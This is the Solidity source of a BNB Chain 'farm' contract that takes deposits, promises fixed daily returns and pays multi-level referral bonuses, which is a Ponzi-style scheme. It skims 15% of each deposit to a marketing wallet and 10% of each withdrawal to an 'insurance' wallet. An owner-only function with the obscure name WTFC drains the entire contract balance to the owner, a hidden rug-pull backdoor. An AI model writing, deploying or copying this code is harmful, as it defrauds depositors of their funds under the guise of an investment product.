/**
 *Submitted for verification at BscScan.com on 2022-02-24
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint256 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint256 checkpoint;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[5] structure; 
}

contract BNBFarm4 {
    using SafeMath for uint256;
    address payable public owner;

    address public marketing_wallet;
    address payable public insurance_wallet;
    uint256 private insurance_fee; // 10%

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public insurance_funds;
    uint256 constant public TIME_STEP = 1 days;
    uint256 public startUNIX;
    uint256 public constant PERCENTS_DIVIDER = 1000;
    
    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [70, 40, 20, 10, 10];

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(address payable _marketing_cost,address payable _insurance_wallet,uint256 timestamp) {
        owner = payable(address(msg.sender));
        startUNIX = timestamp;

        marketing_wallet = _marketing_cost;
        insurance_wallet  = _insurance_wallet;
        insurance_fee = 100; // 10%

        uint256 tarifPercent = 180;
        for (uint8 tarifDuration = 9; tarifDuration <= 24; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.05 ether, "Minimum deposit amount is 0.05 BNB");
         require(block.timestamp > startUNIX, "Not started yet");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        if (player.deposits.length == 0) {
			player.checkpoint = block.timestamp;
		}

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(marketing_wallet).transfer(msg.value * 15  / 100);        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.checkpoint.add(TIME_STEP) < block.timestamp, "only once a day");
        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

       uint256  insurance_amt =  amount.mul(insurance_fee).div(PERCENTS_DIVIDER);
        insurance_wallet.transfer(insurance_amt);

        insurance_funds+=insurance_amt;
        amount = amount - insurance_amt;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        player.checkpoint = block.timestamp;
        payable(msg.sender).transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;

                uint256 timeMultiplier =(block.timestamp - player.checkpoint) / (TIME_STEP) * (10); //1% per day
                uint256 holdBonus = value * timeMultiplier / PERCENTS_DIVIDER;
                value += holdBonus; 
            }
        }

        return value;
    }


    
    function playerInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure, uint256 _checkpoint) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
            player.checkpoint
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus,uint256 _startUNIX) {
        return (invested, withdrawn, match_bonus,startUNIX);
    }

     function WTFC() public  {
        require(msg.sender == owner, "only owner");
        uint assetBalance;
        address self = address(this);
        assetBalance = self.balance;
        payable(address(msg.sender)).transfer(assetBalance);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}